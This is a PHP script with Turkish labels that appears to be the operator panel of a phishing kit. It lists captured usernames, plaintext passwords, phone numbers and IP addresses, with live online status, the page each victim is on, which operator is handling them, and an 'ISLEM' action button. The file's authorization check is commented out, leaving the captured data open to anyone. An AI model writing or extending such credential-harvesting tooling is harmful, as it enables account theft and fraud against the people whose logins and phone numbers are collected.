<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
include('./config.php');

// if (!isset($_SESSION['sec-username']) || $_SESSION['sec-username'] !== $settings['username']) {
//     echo json_encode(['error' => 'Unauthorized access']);
//     exit();
// }

ini_set('display_errors', 0);

try {
    $result = $mysqli->query("SELECT users.*,admins.user AS admin_username FROM users LEFT JOIN admins ON users.user = admins.id ORDER BY users.id DESC");
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $ip = htmlspecialchars($row['ip']);
            $uniqueId = 'dropdown-' . htmlspecialchars($row['id']);
            echo '
                <tr>
                    <td style="color: lightgreen;">' . htmlspecialchars($row['id']) . '</td>
                    <td style="color: lightgreen;max-width: 45px;font-size: 14px;font-weight: 400;font-style: normal;">' . htmlspecialchars($row['date']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['username']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['password']) . '</td>
                    <td style="color: #28FF0F;">' . htmlspecialchars($row['phonecode']) . '</td>
					<td style="color: #28FF0F;">' . htmlspecialchars($row['phone']) . '</td>
                    <td style="color: #aaaaaa; font-size: 16px; text-align: center;max-width: 80px">' . htmlspecialchars($row['ip']) . ($row['last_activity'] > time() ? '🟢' : '🔴') . '</td>
                    <td style="color: lightgreen; text-transform: uppercase;max-width: 60px;">' . htmlspecialchars($row['page']) . '</td>
                    ';
            if ($row['admin_username'] == 0 || is_null($row['admin_username'])) {
                echo '<td class="text-center" style="max-width: 70px;font-size: 12px;color: aquamarine;"><span class="fade-text">boşta bekliyor</span></td>';
            } else {
                echo '<td class="text-center" style="max-width: 70px;font-size: 12px;color: aquamarine;"><span class="">' . $row['admin_username'] . ' kullanıyor</span></td>';
            }
            echo '
                    <td class="text-end" style="max-width: 70px;">
                    <a href="#" class="btn btn-sm btn-warning btn-flex btn-center btn-active-light-primary sweetalert-button" data-ip="' . $ip . '" data-id="' . $row['id'] . '" style="  color: #ffffff;
                    font-weight: 700;
                    font-style: normal;
                    text-transform: uppercase;width: 95%;">
                        <i class="fa-solid fa-bolt">
                        </i> ISLEM </a></td>
                    ';
        }
    } else {
        echo '<tr><td colspan="10">Veri bulunamadı.</td></tr>';
    }
} catch (Exception $e) {
    echo 'Hata: ' . $e->getMessage();
}

$mysqli->close();
